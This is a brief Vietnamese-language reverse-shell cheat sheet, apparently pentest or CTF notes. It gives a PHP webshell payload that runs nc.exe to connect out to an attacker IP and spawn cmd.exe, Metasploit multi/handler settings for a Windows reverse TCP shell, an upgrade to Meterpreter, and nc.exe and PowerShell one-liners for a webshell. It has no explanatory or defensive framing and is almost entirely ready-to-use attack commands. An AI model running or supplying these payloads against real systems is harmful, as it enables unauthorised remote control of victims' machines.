**1. PHP**
- PHP payload: `<?php exec("nc.exe 10.0.0.10 4444 -e cmd.exe"); ?>`
- Msfconsole
```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST 10.0.0.10
set LPORT 4444
exploit
```
- Upgrade lên Meterpreter: `sessions -u <id>`

**2. Hứng nc.exe**
- Trên webshell: `nc.exe <your_ip> 443 -e cmd.exe`, `powershell -c "nc.exe <your_ip> 443 -e cmd.exe"`
- Trên msfconsole:
```
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp   # nếu target 64-bit (phổ biến)
# hoặc windows/shell_reverse_tcp nếu 32-bit
set LHOST <your_ip>   # ví dụ 10.0.0.10
set LPORT 443         # giữ nguyên port 443 như cũ
set ExitOnSession false   # để có thể bắt nhiều session
exploit -j                # chạy background
```

